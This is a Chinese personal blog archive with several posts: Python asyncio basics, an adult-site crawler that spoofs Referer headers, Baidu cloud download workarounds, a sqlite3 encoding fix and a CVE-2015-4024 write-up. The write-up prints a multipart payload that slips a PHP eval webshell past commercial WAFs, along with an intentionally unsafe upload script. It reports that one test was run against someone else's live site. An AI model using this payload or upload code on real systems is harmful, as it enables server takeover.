<p>于是，所有任务可以分成两种，一种是同步任务（synchronous），另一种是异步任务（asynchronous）。同步任务指的是，在主线程上排队执行的任务，只有前一个任务执行完毕，才能执行后一个任务；异步任务指的是，不进入主线程、而进入”任务队列”（task queue）的任务，只有”任务队列”通知主线程，某个异步任务可以执行了，该任务才会进入主线程执行。<br>具体来说，异步执行的运行机制如下。（同步执行也是如此，因为它可以被视为没有异步任务的异步执行。）</p>
<pre><code>（1）所有同步任务都在主线程上执行，形成一个执行栈（execution context stack）。
（2）主线程之外，还存在一个&quot;任务队列&quot;（task queue）。只要异步任务有了运行结果，就在&quot;任务队列&quot;之中放置一个事件。
（3）一旦&quot;执行栈&quot;中的所有同步任务执行完毕，系统就会读取&quot;任务队列&quot;，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态，进入执行栈，开始执行。
（4）主线程不断重复上面的第三步。
</code></pre><p>下图就是主线程和任务队列的示意图。</p>
<p><img src="http://image.beekka.com/blog/2014/bg2014100801.jpg" alt=""></p>
<p>只要主线程空了，就会去读取”任务队列”，这个过程会不断重复。</p>
<p>所谓异步是相对于同步（Synchronous）的概念来说的，之所以容易造成混乱，是因为刚开始接触这两个概念时容易把同步看做是同时，而同时不是意味着并行（Parallel）吗？然而实际上同步或者异步是针对于时间轴的概念，同步意味着顺序、统一的时间轴，而异步则意味着乱序、效率优先的时间轴。比如在爬虫运行时，先抓取 A 页面，然后从中提取下一层页面 B 的链接，此时的爬虫程序的运行只能是同步的，B 页面只能等到 A 页面处理完成之后才能抓取；然而对于独立的两个页面 A1 和 A2，在处理 A1 网络请求的时间里，与其让 CPU 空闲而 A2 等在后面，不如先处理 A2，等到谁先完成网络请求谁就先来进行处理，这样可以更加充分地利用 CPU，但是 A1 和 A2 的执行顺序则是不确定的，也就是异步的。</p>
<h1 id="为什么要使用异步编程？"><a href="#为什么要使用异步编程？" class="headerlink" title="为什么要使用异步编程？"></a>为什么要使用异步编程？</h1><p>CPU的速度远远快于磁盘、网络等IO。在一个线程中，CPU执行代码的速度极快，然而，一旦遇到IO操作，如读写文件、发送网络数据时，就需要等待IO操作完成，才能继续进行下一步操作。这种情况称为同步IO。</p>
<p>在IO操作的过程中，当前线程被挂起，而其他需要CPU执行的代码就无法被当前线程执行了。</p>
<p>因为一个IO操作就阻塞了当前线程，导致其他代码无法执行，所以我们必须使用多线程或者多进程来并发执行代码，为多个用户服务。每个用户都会分配一个线程，如果遇到IO导致线程被挂起，其他用户的线程不受影响。</p>
<p>多线程和多进程的模型虽然解决了并发问题，但是系统不能无上限地增加线程。由于系统切换线程的开销也很大，所以，一旦线程数量过多，CPU的时间就花在线程切换上了，真正运行代码的时间就少了，结果导致性能严重下降。</p>
<p>由于我们要解决的问题是CPU高速执行能力和IO设备的龟速严重不匹配，多线程和多进程只是解决这一问题的一种方法。</p>
<p>另一种解决IO问题的方法是异步IO。当代码需要执行一个耗时的IO操作时，它只发出IO指令，并不等待IO结果，然后就去执行其他代码了。一段时间后，当IO返回结果时，再通知CPU进行处理。</p>
<h1 id="如何利用Python实现异步"><a href="#如何利用Python实现异步" class="headerlink" title="如何利用Python实现异步"></a>如何利用Python实现异步</h1><p>我们首先需要了解以下几个概念：</p>
<ul>
<li>Event Loop</li>
<li>Coroutine</li>
</ul>
<p>其中Event Loop在前面已经解释过<br>Coroutine是协程，具体解释可以查阅<a href="http://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001432090171191d05dae6e129940518d1d6cf6eeaaa969000" target="_blank" rel="noopener">协程</a></p>
<p>Python 3.5 以后推荐使用 async/await 关键词来定义协程，它具有如下特性：</p>
<ul>
<li>通过 await 将可能阻塞的行为挂起，直到有结果之后继续执行，Event loop 也是据此来对多个协程的执行进行调度的；</li>
<li>协程并不像一般的函数一样，通过 coro() 进行调用并不会执行它，而只有将它放入 Event loop 进行调度才能执行。</li>
</ul>
<p>这里我就从廖大哪里搬运个小例子(有改动)<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'Hello world! (%s)'</span> % threading.currentThread())</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'Hello again! (%s)'</span> % threading.currentThread())</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">tasks = [hello(), hello()]</span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line">loop.close()</span><br></pre></td></tr></table></figure></p>
<p>执行结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Hello world! (&lt;_MainThread(MainThread, started <span class="number">140735195337472</span>)&gt;)</span><br><span class="line">Hello world! (&lt;_MainThread(MainThread, started <span class="number">140735195337472</span>)&gt;)</span><br><span class="line">(暂停约<span class="number">1</span>秒)</span><br><span class="line">Hello again! (&lt;_MainThread(MainThread, started <span class="number">140735195337472</span>)&gt;)</span><br><span class="line">Hello again! (&lt;_MainThread(MainThread, started <span class="number">140735195337472</span>)&gt;)</span><br></pre></td></tr></table></figure>
<p>其中sleep是我们模拟的io用时，我么你可以从这个小例子中看出，执行hello()的时候，io并未堵塞，而是继续向下执行<br>hello()会首先打印出Hello world!，然后，由于asyncio.sleep()是一个coroutine，所以线程不会等待asyncio.sleep()，而是直接中断并执行下一个消息循环。当asyncio.sleep()完成时，线程就可以接着执行下一行语句。</p>
<p>下一篇文章将在此基础上实现一个简洁、普适的爬虫框架</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>javbus爬虫-老司机你值得拥有</title>
    <url>/2016/12/06/javbus%E7%88%AC%E8%99%AB-%E8%80%81%E5%8F%B8%E6%9C%BA%E4%BD%A0%E5%80%BC%E5%BE%97%E6%8B%A5%E6%9C%89.html</url>
    <content><![CDATA[<hr>
<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><hr>
<p>有个朋友叫我帮忙写个爬虫，爬取javbus5上面所有的详情页链接，也就是所有的<a href="https://www.javbus5.com/SRS-055这种链接，" target="_blank" rel="noopener">https://www.javbus5.com/SRS-055这种链接，</a><br>我一看，嘿呀，这是司机的活儿啊，我绝对不能辱没我老司机的名声（被败坏了可不好），于是开始着手写了</p>
<hr>
<h1 id="构思"><a href="#构思" class="headerlink" title="构思"></a>构思</h1><hr>
<ul>
<li>爬虫调度启动程序crawler.py</li>
<li>页面下载程序downloader.py</li>
<li>页面解析程序pageparser.py</li>
<li>数据库入库与去重管理程序controler.py</li>
</ul>
<a id="more"></a>
<p>爬取入口为第一页，当页面中存在下一页的超链接继续往下爬，这是个死循环，跳出条件为没有了下一页的链接</p>
<p>在某一页中解析页面，返回所有的详情页链接，利用迭代器返回，然后在主程序中调用解析程序对页面信息进行解析并包装成字典返回，其中用详情页网址作为数据库主键，其他信息依次写入数据库</p>
<p>当这一页所有的子链接爬取完成后，继续爬取下一页。</p>
<p>将数据存入数据库，用的是sqllite3,失败的网址页存入一个fail_url.txt。</p>
<p>对于增量爬取，我是这么做的，当爬取到相同的网址时结束程序，这么做也有漏洞，才疏学浅，我没想到太好的办法，希望有好办法的给我说一声（布隆过滤正在研究之中），如果用数据库查询去重，那么势必导致二次爬取，我们都知道，爬虫更多的时间是花在网络等待上</p>
<hr>
<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><hr>
<p>在写爬虫的过程中遇到了一些问题</p>
<ol>
<li><p>在墙内爬不动，爬取几个之后就失败，这个解决方案只需要全局翻墙爬取就可以了</p>
</li>
<li><p>本来之前加了多线程并发爬取，但是发现爬取一段时间后会封ip导致整体无法运行，本来想搞个代理池进行并发，结果网上免费的代理太慢太慢，根本打不开网页，于是就改回了单线程</p>
</li>
<li><p>就是我的那个不完善的增量爬取，导致了你一次爬取就需要爬取完成，不然数据库里面存在你之前爬到的，爬取到你已有的会直接停止</p>
</li>
<li><p>存在反扒策略<br>详情页中的磁力链接是ajax动态加载的，通过分析抓包，可以在XHR中找到是一个get请求，至于参数，我开始不知道怎么得来的，后来在html代码中找到了，我放几张图大家就明白了<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_001.jpg" alt="1"></p>
<p>我们通过对响应内容的查看可以发现磁力的加载访问了类似于这样一个网址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://www.javbus5.com/ajax/uncledatoolsbyajax.php?gid=30100637207&amp;lang=zh&amp;img=https://pics.javbus.info/cover/59pc_b.jpg&amp;uc=0&amp;floor=921</span><br></pre></td></tr></table></figure>
<p>那么这些get参数是从哪里来呢，这就是通过经验与基本功去发现了</p>
<p>通过对html源文件的搜索，我们即可直接发现答案<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_003.png" alt="3"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_004.png" alt="4"><br>通过分析发现，后面的floor是个随机数参数，一般这种参数可以去除无影响，事实也是这样</p>
<p>我利用HttpRequest模拟发包，对这个请求直接get，发现所有数据隐藏<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_002.png" alt="2"></p>
<p>那么肯定是有反扒的策略，伪造请求头，反扒也就那么几种，通过分析发现是同源策略，对Referer请求头伪造成来源网址就可以直接获取到内容了<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_005.png" alt="5"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_006.jpg" alt="6"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_007.png" alt="7"></p>
</li>
<li><p>常见的Python2.x编码问题,全部转换为unicode字节流就可以了<br> 这个问题在我博客中已经记录了<a href="http://www.53xiaoshuo.com/Python/77.html" target="_blank" rel="noopener">http://www.53xiaoshuo.com/Python/77.html</a><br> 有兴趣的童鞋可以看看</p>
</li>
<li><p>遇到的最闹心问题是详情页的项目抓取，有的详情页的类别不同，我开始只分析了一个页面，导致写的规则在有的页面上频频出错<br>导致后面对抓取规则进行了大改,重写了分析规则，用了个笨办法，毕竟那小块的html写的十分不规范，正则规则有三种，挺烦人<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_008.png" alt="8"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_009.jpg" alt="9"><br>比如上图的两个就不同，html代码更是稀烂，需要判断有没有这个项，没有就设置空字节入库</p>
<p>在这其中纠结了一个问题<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_010.png" alt="10"></p>
<p>就是对于这两种的比较，我想上面这种变成下面这种，毕竟第一种的话，soup.find要执行两次，但是下面这种又要比上面那个多一行，丑一点<br>最后我选择了第二种，所有的信息分析代码就不贴了，具体想看的直接看我的代码文件就好了</p>
</li>
</ol>
<hr>
<h1 id="小Tips"><a href="#小Tips" class="headerlink" title="小Tips"></a>小Tips</h1><hr>
<ol>
<li><p>对于动态加载的内容的爬取，能不用selenium去模拟浏览器爬取就不用，耗费资源，更好的是自己分析网络请求，然后构造</p>
</li>
<li><p>对于页面信息的解析，要多看几个页面，看是否相同，别到时候做多事情</p>
</li>
<li><p>多看别人的博客学习思路</p>
</li>
</ol>
<hr>
<h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><hr>
<p>爬虫依赖的第三方库有Requests，BeautifulSoup，使用前请先pip install这两个第三方库</p>
<hr>
<h1 id="测试展与地址"><a href="#测试展与地址" class="headerlink" title="测试展与地址"></a>测试展与地址</h1><hr>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_011.jpg" alt="11"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/javbus_012.jpg" alt="12"></p>
<hr>
<h2 id="代码地址"><a href="#代码地址" class="headerlink" title="代码地址:"></a>代码地址:</h2><hr>
<ul>
<li><em>coding.net</em>    <a href="https://coding.net/u/Akkuman/p/Javbus_crawler" target="_blank" rel="noopener">javbus_crawler</a></li>
<li><em>github.com</em>    <a href="https://github.com/akkuman/Javbus_crawler" target="_blank" rel="noopener">javbus_crawler</a></li>
</ul>
<p>司机的名声总算是没有辱没，秋名山依旧，嘿嘿<br><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=2070695546,2193961465&amp;fm=116&amp;gp=0.jpg" alt="13"></p>
<p><strong>转载请注明来源作者</strong></p>
<ul>
<li>博客：53xiaoshuo.com | hacktech.cn</li>
<li>作者：Akkuman</li>
</ul>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>life</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>突破百度云限速与网页限制批量下载</title>
    <url>/2016/12/06/%E7%AA%81%E7%A0%B4%E7%99%BE%E5%BA%A6%E4%BA%91%E9%99%90%E9%80%9F%E4%B8%8E%E7%BD%91%E9%A1%B5%E9%99%90%E5%88%B6%E6%89%B9%E9%87%8F%E4%B8%8B%E8%BD%BD.html</url>
    <content><![CDATA[<p><strong>百度云限速比较坑，现在基本200k左右</strong><br><strong>很多人都知道了，但是总有朋友问我，我说明一下</strong></p>
<h1 id="首先下载IDM-最好支持正版"><a href="#首先下载IDM-最好支持正版" class="headerlink" title="首先下载IDM(最好支持正版)"></a>首先下载IDM(最好支持正版)</h1><p>下载链接：<br><a href="https://eyun.baidu.com/s/3nvg3jdf" target="_blank" rel="noopener">百度云shaoit</a></p>
<h1 id="开始下载："><a href="#开始下载：" class="headerlink" title="开始下载："></a>开始下载：</h1><p>一般的话，小文件直接打开浏览器就可以下载</p>
<h1 id="大文件下载："><a href="#大文件下载：" class="headerlink" title="大文件下载："></a>大文件下载：</h1><p>首先在chrome浏览器中装上一个User-Agent Switcher for (Google)Chrome插件,然后选择安卓手机，也就是打开这个的手机页面，然后直接用IDM下载</p>
<h1 id="批量下载与外链获取"><a href="#批量下载与外链获取" class="headerlink" title="批量下载与外链获取"></a>批量下载与外链获取</h1><p>使用这个脚本，具体看链接内介绍</p>
<a id="more"></a>
<p><a href="https://greasyfork.org/zh-CN/scripts/23635-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E5%8A%A9%E6%89%8B" target="_blank" rel="noopener">https://greasyfork.org/zh-CN/scripts/23635-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E5%8A%A9%E6%89%8B</a></p>
<h2 id="如何安装用户脚本"><a href="#如何安装用户脚本" class="headerlink" title="如何安装用户脚本"></a>如何安装用户脚本</h2><ul>
<li>Firefox 及相关的浏览器：Greasemonkey。</li>
<li>Google Chrome、Chromium 及相关的浏览器：Tampermonkey。</li>
<li>Opera (版本 15 及更晚)：Tampermonkey 或者 Violentmonkey。</li>
<li>Opera 版本 12 及更早原生支持用户脚本。但 Violentmonkey 能提供更友好的界面和更好的兼容性。</li>
</ul>
]]></content>
      <categories>
        <category>life</category>
      </categories>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title>ProgrammingError: You must not use 8-bit bytestrings...</title>
    <url>/2016/12/06/ProgrammingError-You-must-not-use-8-bit-bytestrings.html</url>
    <content><![CDATA[<h1 id="问题出现："><a href="#问题出现：" class="headerlink" title="问题出现："></a>问题出现：</h1><p>You must not use 8-bit bytestrings unless you use a text_factory that can interpret 8-bit bytestrings (like text_factory = str). It is highly recommended that you instead just switch your application to Unicode strings.</p>
<h1 id="产生原因："><a href="#产生原因：" class="headerlink" title="产生原因："></a>产生原因：</h1><p>问题在用Python的sqlite3操作数据库要插入的字符串中含有非ascii字符时产生，做插入的时候就报当前这个错误。</p>
<h1 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h1><h2 id="1-按提示"><a href="#1-按提示" class="headerlink" title="1. 按提示"></a>1. 按提示</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">connection = sqlite3.connect(...)</span><br><span class="line">connection.text_factory = str</span><br></pre></td></tr></table></figure>
<p>但是如果字符中出现非ascii字符，那么依然不能解决问题，会产生不可预知的乱码，这样可以参考 2</p>
<h2 id="2-以utf8的编码格式进行解码转为unicode编码做插入"><a href="#2-以utf8的编码格式进行解码转为unicode编码做插入" class="headerlink" title="2. 以utf8的编码格式进行解码转为unicode编码做插入"></a>2. 以utf8的编码格式进行解码转为unicode编码做插入</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cursor.execute(<span class="string">'''</span></span><br><span class="line"><span class="string">    INSERT INTO JAVBUS_DATA (姓名, 年龄)</span></span><br><span class="line"><span class="string">    VALUES (?, ?)</span></span><br><span class="line"><span class="string">    '''</span>, (<span class="string">'张三'</span>.decode(<span class="string">'utf-8'</span>), <span class="string">'22岁'</span>.decode(<span class="string">'utf-8'</span>)))</span><br></pre></td></tr></table></figure>
<p>但是如果数据太长，这样一个一个敲挺麻烦的，下面是一个使用map函数简化的小例子</p>
<a id="more"></a>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_utf8</span><span class="params">(aStr)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> aStr.decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">conn = sqlite3.connect(<span class="string">"something.db"</span>)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line"></span><br><span class="line">cursor.execute(<span class="string">'''</span></span><br><span class="line"><span class="string">    CREATE TABLE IF NOT EXISTS JAVBUS_DATA(</span></span><br><span class="line"><span class="string">        id       INT PRIMARY KEY,</span></span><br><span class="line"><span class="string">        姓名     TEXT,</span></span><br><span class="line"><span class="string">        年龄     TEXT);'''</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Table created successfully"</span></span><br><span class="line">cursor.execute(<span class="string">'''</span></span><br><span class="line"><span class="string">    INSERT INTO JAVBUS_DATA (姓名, 年龄)</span></span><br><span class="line"><span class="string">    VALUES (?, ?)</span></span><br><span class="line"><span class="string">    '''</span>, map(decode_utf8, (<span class="string">'张三'</span>, <span class="string">'22岁'</span>)))</span><br><span class="line"></span><br><span class="line">cursor.close()</span><br><span class="line">conn.commit()</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>
<h1 id="其他注意："><a href="#其他注意：" class="headerlink" title="其他注意："></a>其他注意：</h1><p>有时用第二种方法会出现UnicodeDecodeError<br>加入#-<em>-coding:utf-8-</em>-<br>还是不行请sys指定编码：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line">reload(sys)  </span><br><span class="line">sys.setdefaultencoding(<span class="string">'utf8'</span>)</span><br></pre></td></tr></table></figure></p>
<p><strong>这个问题在python3应该不会出现，python2编码问题，仅作记录</strong></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>WAF攻防研究之四个层次Bypass WAF</title>
    <url>/2016/09/25/WAF%E6%94%BB%E9%98%B2%E7%A0%94%E7%A9%B6%E4%B9%8B%E5%9B%9B%E4%B8%AA%E5%B1%82%E6%AC%A1Bypass-WAF.html</url>
    <content><![CDATA[<h1 id="绝对值得一看的技术文章"><a href="#绝对值得一看的技术文章" class="headerlink" title="绝对值得一看的技术文章"></a>绝对值得一看的技术文章</h1><p><a href="http://7xusrl.com1.z0.glb.clouddn.com/WAF%E6%94%BB%E9%98%B2%E7%A0%94%E7%A9%B6%E4%B9%8B%E5%9B%9B%E4%B8%AA%E5%B1%82%E6%AC%A1Bypass%20WAF.pdf" target="_blank" rel="noopener">pdf下载链接</a></p>
<p><em>[via@<a href="http://weibo.com/ttarticle/p/show?id=2309404007261092631700" target="_blank" rel="noopener">破-见</a> ]</em></p>
]]></content>
      <categories>
        <category>Hacker</category>
      </categories>
      <tags>
        <tag>Hacker</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP DOS漏洞的新利用：CVE-2015-4024 Reviewed</title>
    <url>/2016/09/24/PHP-DOS%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%96%B0%E5%88%A9%E7%94%A8%EF%BC%9ACVE-2015-4024-Reviewed.html</url>
    <content><![CDATA[<h1 id="1-背景介绍"><a href="#1-背景介绍" class="headerlink" title="1.     背景介绍"></a>1.     背景介绍</h1><p>今天我们想从2015.04.03的一个PHP远程dos漏洞（CVE-2015-4024）说起。技术细节见如下链接，<a href="https://bugs.php.net/bug.php?id=69364" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=69364</a>。因为php解析body part的header时进行字符串拼接，而拼接过程重复拷贝字符导致DOS。事实上该漏洞还有其他非dos的利用价值，其中之一，就是绕过当前各种云WAF的文件上传防御策略。</p>
<p>目前国内外流行的云WAF厂商有如百度云加速，360网站卫士，加速乐，云盾等。因为PHP远程dos漏洞及PHP官方修复方案的特点，我们成功利用该漏洞绕过了当前主流WAF的文件上传防御，例如百度云加速、360网站卫士、知道创于加速乐、安全狗。</p>
<p>接下来，我们以PHP为例，详细解析我们的绕过方法。</p>
<h1 id="2-绕过WAF的原理"><a href="#2-绕过WAF的原理" class="headerlink" title="2.     绕过WAF的原理"></a>2.     绕过WAF的原理</h1><p>根据PHP DOS漏洞原理，在multipart_buffer_headers函数解析header对应value时，value值存在n行。每行的字符串以空白符开头或不存字符’:’，都触发以下合并value的代码块。那么解析header的value就要执行(n-1)次合并value的代码块，从而导致DOS。</p>
<a id="more"></a>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">prev_len= strlen(prev_entry.value);</span><br><span class="line"></span><br><span class="line">cur_len= strlen(line);</span><br><span class="line"></span><br><span class="line">entry.value= emalloc(prev_len + cur_len + <span class="number">1</span>); <span class="comment">//1次分片内存</span></span><br><span class="line"></span><br><span class="line">memcpy(entry.value,prev_entry.value, prev_len); <span class="comment">//1次拷贝</span></span><br><span class="line"></span><br><span class="line">memcpy(entry.value+ prev_len, line, cur_len);   <span class="comment">//1次拷贝</span></span><br><span class="line"></span><br><span class="line">entry.value[cur_len+ prev_len] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">entry.key= estrdup(prev_entry.key);</span><br><span class="line"></span><br><span class="line">zend_llist_remove_tail(header);<span class="comment">//1次内存释放</span></span><br></pre></td></tr></table></figure>
<p>而PHP官方修复方案，在进行合并时，避免重复拷贝，从而避免DOS。绕过WAF的关键在于，PHP multipart_buffer_headers函数解析header对应value时，value值存在多行。每行的字符串以空白符开头或不存字符’:’，将进行合并。而WAF在解析文件上传的文件名时，没有考虑协议兼容，不进行多行合并，就可以被绕过。</p>
<p>根据原理构造绕过WAF文件上传防御的payload，WAF解析到的文件名为”test3.jpg”，而PHP解析到的文件名是”test3.jpg\nf/shell.php”，因为”/”是目录分隔符，上传的文件名变为shell.php。以下是绕过paylaod、测试脚本、paylaod进行文件上传的效果图。</p>
<h2 id="WAF绕过payload"><a href="#WAF绕过payload" class="headerlink" title="WAF绕过payload:"></a>WAF绕过payload:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">------WebKitFormBoundaryx7V4AhipWn8ig52y</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test3.jpg\nsf/shell.php</span><br><span class="line"></span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_GET[&apos;c&apos;])?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryx7V4AhipWn8ig52y</span><br></pre></td></tr></table></figure>
<h2 id="文件上传功能测试脚本"><a href="#文件上传功能测试脚本" class="headerlink" title="文件上传功能测试脚本:"></a>文件上传功能测试脚本:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">         $name = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> $name;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">        move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>] , <span class="string">'/usr/local/nginx/html/upload/'</span>.$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"upload success! "</span>.$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> strlen($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>Payload能够正常上传</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6apwul8mrj30r50fptbm.jpg" alt="1"></p>
<h1 id="3-绕过WAF实战"><a href="#3-绕过WAF实战" class="headerlink" title="3.     绕过WAF实战"></a>3.     绕过WAF实战</h1><p>笔者通过搭建自己的测试站，接入360网站卫士和加速乐，验证绕过WAF文件上传防御的方法。</p>
<h2 id="3-1-绕过360网站卫士"><a href="#3-1-绕过360网站卫士" class="headerlink" title="3.1 绕过360网站卫士"></a>3.1 绕过360网站卫士</h2><h3 id="步骤1，验证网站已被360网站卫士防御，拦截了直接上传PHP文件的请求。"><a href="#步骤1，验证网站已被360网站卫士防御，拦截了直接上传PHP文件的请求。" class="headerlink" title="步骤1，验证网站已被360网站卫士防御，拦截了直接上传PHP文件的请求。"></a>步骤1，验证网站已被360网站卫士防御，拦截了直接上传PHP文件的请求。</h3><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6apy2esg5j311v0ifdjx.jpg" alt="2"></p>
<h3 id="步骤2：成功绕过360网站卫士，上传shell成功，文件是apo-php。在该请求中，有没有Content-Type不影响绕过。"><a href="#步骤2：成功绕过360网站卫士，上传shell成功，文件是apo-php。在该请求中，有没有Content-Type不影响绕过。" class="headerlink" title="步骤2：成功绕过360网站卫士，上传shell成功，文件是apo.php。在该请求中，有没有Content-Type不影响绕过。"></a>步骤2：成功绕过360网站卫士，上传shell成功，文件是apo.php。在该请求中，有没有Content-Type不影响绕过。</h3><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6apztziwvj30vm0g9af6.jpg" alt="3"></p>
<h2 id="3-2-绕过知道创宇加速乐"><a href="#3-2-绕过知道创宇加速乐" class="headerlink" title="3.2 绕过知道创宇加速乐"></a>3.2 绕过知道创宇加速乐</h2><h3 id="步骤一：验证网站被加速乐保护，拦截了直接上传PHP文件的请求。"><a href="#步骤一：验证网站被加速乐保护，拦截了直接上传PHP文件的请求。" class="headerlink" title="步骤一：验证网站被加速乐保护，拦截了直接上传PHP文件的请求。"></a>步骤一：验证网站被加速乐保护，拦截了直接上传PHP文件的请求。</h3><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6aq0sw1luj30wb0f9wjf.jpg" alt="4"></p>
<h3 id="步骤二：成功绕过加速乐，上传shell，文件是syt-php。"><a href="#步骤二：成功绕过加速乐，上传shell，文件是syt-php。" class="headerlink" title="步骤二：成功绕过加速乐，上传shell，文件是syt.php。"></a>步骤二：成功绕过加速乐，上传shell，文件是syt.php。</h3><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6aq1mvbrqj30vr0elwh2.jpg" alt="5"></p>
<h2 id="3-3-绕过百度云加速"><a href="#3-3-绕过百度云加速" class="headerlink" title="3.3. 绕过百度云加速"></a>3.3. 绕过百度云加速</h2><p>百度云加速与CloudFlare，从百度匀加速拦截页面可以看出使用的是CloudFlare. 但是估计有本地化，百度云加速应该是百度和CloudFlare共同产物吧。测试百度没有搭建自己的测试环境，找了个接入了百度云加速的站进行测试。</p>
<h3 id="步骤一：验证网站被百度云加速保护，拦截了直接上传PHP文件的请求。"><a href="#步骤一：验证网站被百度云加速保护，拦截了直接上传PHP文件的请求。" class="headerlink" title="步骤一：验证网站被百度云加速保护，拦截了直接上传PHP文件的请求。"></a>步骤一：验证网站被百度云加速保护，拦截了直接上传PHP文件的请求。</h3><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6aq30m0wjj31050etdko.jpg" alt="6"></p>
<h3 id="步骤二：成功绕过云加速"><a href="#步骤二：成功绕过云加速" class="headerlink" title="步骤二：成功绕过云加速"></a>步骤二：成功绕过云加速</h3><p>同上</p>
<h1 id="4-扩展—更多的工作"><a href="#4-扩展—更多的工作" class="headerlink" title="4.     扩展—更多的工作"></a>4.     扩展—更多的工作</h1><h2 id="4-1-分析filename其他字符的绕过"><a href="#4-1-分析filename其他字符的绕过" class="headerlink" title="4.1 分析filename其他字符的绕过"></a>4.1 分析filename其他字符的绕过</h2><p>同理，我们发现除了双引号外，使用单引号也能绕过WAF的防御，并实现文件上传。</p>
